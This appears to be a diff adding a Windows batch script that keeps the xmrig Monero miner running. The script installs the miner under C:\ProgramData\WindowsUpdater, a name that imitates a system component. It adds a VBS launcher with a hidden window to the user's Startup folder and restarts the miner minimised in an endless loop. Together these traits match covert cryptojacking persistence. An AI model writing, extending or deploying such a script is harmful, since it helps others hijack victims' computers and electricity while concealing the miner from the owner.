@@ -1,0 +1,93 @@
+@echo off
+REM Monero Watchdog Script - Ensures single xmrig.exe instance
+title Monero Watchdog - High Mid-End PC
+color 0A
+
+REM ====================================================================
+REM Runs single xmrig.exe instance, auto-starts via VBS if enabled
+REM ====================================================================
+setlocal enableextensions enabledelayedexpansion
+
+REM === CONFIGURATION ===
+set "DEST=C:\ProgramData\WindowsUpdater"
+set "LOG_FILE=%DEST%\miner.log"
+set "WATCHDOG_LOG=%DEST%\watchdog.log"
+set "LOCK_FILE=%DEST%\watchdog.lock"
+
+REM === Debug Logging ===
+echo [*] Watchdog script started at %date% %time% > "%WATCHDOG_LOG%"
+echo [*] Running as user: %username% >> "%WATCHDOG_LOG%"
+
+REM === Check for Admin ===
+echo [*] Checking for admin privileges...
+echo [*] Checking for admin privileges... >> "%WATCHDOG_LOG%"
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' neq '0' (
+    echo [!] Admin privileges required. Run this script as administrator.
+    echo [!] Admin privileges required. Run this script as administrator. >> "%WATCHDOG_LOG%"
+    pause
+    exit /b 1
+)
+echo [✔] Running with admin privileges. >> "%WATCHDOG_LOG%"
+
+REM === Setup VBS for Auto-Start ===
+echo [*] Setting up VBS for auto-start...
+echo [*] Setting up VBS for auto-start... >> "%WATCHDOG_LOG%"
+echo Set WShell = CreateObject("WScript.Shell") > "%DEST%\start_miner.vbs"
+echo WShell.Run "cmd /c %DEST%\monero_watchdog.bat", 0, False >> "%DEST%\start_miner.vbs"
+copy "%DEST%\start_miner.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1
+if '%errorlevel%' equ '0' (
+    echo [✔] VBS added to startup folder for auto-start. >> "%WATCHDOG_LOG%"
+) else (
+    echo [!] Failed to add VBS to startup folder. Run this script manually after reboot. >> "%WATCHDOG_LOG%"
+)
+
+REM === Watchdog Loop ===
+echo [*] Starting watchdog loop...
+echo [*] Starting watchdog loop... >> "%WATCHDOG_LOG%"
+if exist "%LOCK_FILE%" (
+    echo [!] Another watchdog is already running. Exiting.
+    echo [!] Another watchdog is already running. Exiting. >> "%WATCHDOG_LOG%"
+    pause
+    exit /b 0
+)
+echo Running > "%LOCK_FILE%"
+
+:loop
+REM Count xmrig.exe instances
+for /f "tokens=1" %%i in ('tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /c /i "xmrig.exe"') do set "XMRIG_COUNT=%%i"
+if not defined XMRIG_COUNT (
+    echo [%date% %time%] Failed to count xmrig.exe, assuming 0... >> "%WATCHDOG_LOG%"
+    set "XMRIG_COUNT=0"
+)
+echo [%date% %time%] Found !XMRIG_COUNT! xmrig.exe instances >> "%WATCHDOG_LOG%"
+
+REM Kill all xmrig.exe instances if more than one
+if !XMRIG_COUNT! GTR 1 (
+    echo [%date% %time%] Multiple xmrig.exe detected, killing extras... >> "%WATCHDOG_LOG%"
+    taskkill /IM xmrig.exe /F >> "%WATCHDOG_LOG%" 2>&1
+    ping 127.0.0.1 -n 3 >nul
+)
+
+REM Start single xmrig.exe if none running
+if !XMRIG_COUNT! EQU 0 (
+    echo [%date% %time%] Starting xmrig.exe... >> "%WATCHDOG_LOG%"
+    if exist "%DEST%\xmrig.exe" (
+        start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
+        ping 127.0.0.1 -n 5 >nul
+        tasklist /fi "IMAGENAME eq xmrig.exe" | find "xmrig.exe" >nul
+        if errorlevel 1 (
+            echo [%date% %time%] xmrig.exe failed to start. Check antivirus, %LOG_FILE%, or run manually: %DEST%\xmrig.exe --config=%DEST%\config.json >> "%WATCHDOG_LOG%"
+        ) else (
+            echo [%date% %time%] xmrig.exe started successfully. >> "%WATCHDOG_LOG%"
+        )
+    ) else (
+        echo [%date% %time%] xmrig.exe not found in %DEST%. Run monero_config.bat first. >> "%WATCHDOG_LOG%"
+        del "%LOCK_FILE%" >nul 2>&1
+        pause
+        exit /b 1
+    )
+)
+ping 127.0.0.1 -n 11 >nul
+del "%LOCK_FILE%" >nul 2>&1
+goto loop
